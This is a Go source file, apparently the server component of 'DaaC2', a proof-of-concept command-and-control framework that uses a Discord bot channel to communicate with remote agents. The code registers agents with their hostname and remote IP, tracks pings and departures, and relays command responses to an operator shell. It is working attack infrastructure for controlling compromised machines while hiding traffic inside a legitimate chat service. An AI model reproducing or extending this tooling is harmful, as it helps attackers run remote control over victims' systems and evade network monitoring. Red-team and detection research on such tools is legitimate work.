package main

import (
	"DaaC2/pkg/c2agents"
	"DaaC2/pkg/c2discord"
	"DaaC2/pkg/c2message"
	"DaaC2/pkg/cli"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
	"github.com/fatih/color"
)

func init() {
	quitEarly := false

	if c2discord.Token == "" {
		fmt.Println("Add your auth token in c2discord.go")
		quitEarly = true
	}

	if c2discord.ChannelID == "" {
		fmt.Println("Add your channel id in c2discord.go")
		quitEarly = true
	}

	if quitEarly {
		os.Exit(0)
	}
}

func main() {
	dg, err := discordgo.New("Bot " + c2discord.Token)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	dg.AddHandler(parseMessage)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	go cli.Shell(dg) //  we (for arguments sake) get "stuck" in here, until a quit/exit/signal is issued

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Server is now running. Press CTRL-C to exit or type 'exit'/'quit'.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	// Cleanly close down the Discord session.
	dg.Close()
}

func parseMessage(s *discordgo.Session, m *discordgo.MessageCreate) {
	// decode our b64 message first, derp
	decodedData, _ := base64.StdEncoding.DecodeString(m.Content)

	// now we need to handle the JSON unmarshalling
	var jsonData c2message.Message
	json.Unmarshal(decodedData, &jsonData)

	// quick check to see if we need to ignore the message
	if jsonData.FromServer {
		return // break out early as it's from the server
	}

	// check the type of message
	if jsonData.MessageType == c2message.MESSAGE_AGENT_JOIN {
		color.Green("[+] new agent connected -> " + jsonData.FromID)
		splitData := strings.Split(jsonData.Data, "§") // we can hope the pipe char does't exist in anything else?
		if len(splitData) != 3 {
			color.Red("New agent data had more than 3 chunks... this is weird: " + jsonData.Data)
		}
		// agentID, hostname, remoteIP, time
		c2agents.AddAgentToKnownTable(jsonData.FromID, splitData[0], splitData[1], splitData[2]) // todo, make sure this info is legit
	} else if jsonData.MessageType == c2message.MESSAGE_AGENT_LEFT {
		c2agents.RemoveAgentFromKnownTable(jsonData.FromID)
		color.Yellow(jsonData.Data + " -> " + jsonData.FromID)
		cli.SetStateMainMenu()
	} else if jsonData.MessageType == c2message.MESSAGE_PING {
		color.Yellow("Ping from: " + jsonData.FromID + " at " + jsonData.Data)
		// update the AllAgents table of information here
		// at this point we could fake a secret token that makes sure we dont get a rogue trying to connect to the c2.
		// wont be secure but it's a PoC that the agent was originally part of the server? - persistence if the server goes down etc
		if !c2agents.DoesAgentExistOnServer(jsonData.FromID) {
			c2agents.AddAgentToKnownTable(jsonData.FromID, "", "", "") // need a message type to request agent data again
		}
	} else if jsonData.MessageType == c2message.MESSAGE_RESPONSE {
		// do something
		color.Blue("Response from: " + jsonData.FromID)
		color.Blue(jsonData.Data)
	} else {
		color.Red("Message was not understood: " + m.Content)
	}
}
